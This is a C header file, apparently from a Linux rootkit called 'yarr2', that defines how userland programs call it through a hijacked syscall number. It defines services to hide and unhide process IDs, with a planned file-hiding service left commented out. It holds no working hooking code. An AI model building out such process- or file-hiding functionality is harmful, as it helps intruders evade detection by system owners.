#ifndef __YARR_YARRLIB
#define __YARR_YARRLIB

/*
 * This is the header file userland programs should include in order to be able
 * to request services to yarr2.
 */

// This is the vector used for accessing yarr2 services. It correspond to the
// tuxcall syscall. In my kernels it is not used in the 64-bit table, it is in
// the 32-bit one I think and there it doesn't belong to tuxcall. If your
// kernel does support tuxcall likely you would need to look for another number
// and build yarr2. In reality I think tuxcall is never implemented, that's why
// I chose it.
#define YARR_VECTOR (184)

// Here we define the different services someone can request to yarr2.
enum YARRCALL_VECTORS {
    HIDE_PID = 1,
    STOP_HIDE_PID
};

// TODO: I'm going to define all the argument types for services here. They
// should be declared in their own header files, encapsulated with the rest
// of their subsystem, but I want userland programs to be able to include this
// file and know about these arguments, so to keep things simple I just define
// everything down below.
typedef struct {
    pid_t pid;
} HidePidArgs_t;

// TODO: Example.
//typedef struct {
//    char *name;
//} HideFileArgs_t;

// Each service has its own arguments, we use this union to encapsulate them
// and have easier access for each service.
typedef union {
    HidePidArgs_t hidepid_args;
    // TODO: Example.
    //HideFileArgs_t hidefile_args;
} YarrCallArgs_t;

#endif
